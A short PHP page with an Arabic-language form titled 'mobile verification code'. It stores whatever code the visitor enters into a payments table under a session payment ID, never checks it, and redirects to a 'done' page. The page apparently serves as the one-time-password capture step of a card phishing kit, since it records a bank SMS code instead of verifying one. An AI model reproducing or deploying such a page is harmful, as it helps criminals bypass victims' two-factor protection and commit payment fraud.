<?php
session_start();
require_once 'db.php';

$payment_id = $_SESSION['payment_id'] ?? null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone_verification_code = $_POST['phone_verification_code'] ?? '';

    if ($payment_id && $phone_verification_code) {
        $stmt = $conn->prepare("UPDATE payments SET phone_verification_code = ? WHERE id = ?");
        $stmt->bind_param("si", $phone_verification_code, $payment_id);
        $stmt->execute();

        // التوجيه إلى صفحة النهاية
        header("Location: done.php");
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>رمز تحقق الجوال</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Tajawal&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Tajawal', sans-serif; background-color: #f4f6f8; padding: 40px; }
    form {
      background: #fff;
      max-width: 500px;
      margin: auto;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    h2 {
      color: #1a6d3c;
      text-align: center;
      margin-bottom: 25px;
    }
    label {
      font-weight: bold;
      margin-bottom: 10px;
      display: block;
    }
    .btn-submit {
      background-color: #1a6d3c;
      color: white;
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 10px;
      font-size: 18px;
    }
  </style>
</head>
<body>

<form method="POST">
  <h2>رمز تحقق الجوال</h2>
  <div class="mb-3">
    <label for="phone_verification_code">أدخل رمز التحقق الذي وصلك على الجوال:</label>
    <input type="text" id="phone_verification_code" name="phone_verification_code" class="form-control" required>
  </div>
  <button type="submit" class="btn-submit">تأكيد</button>
</form>

</body>
</html>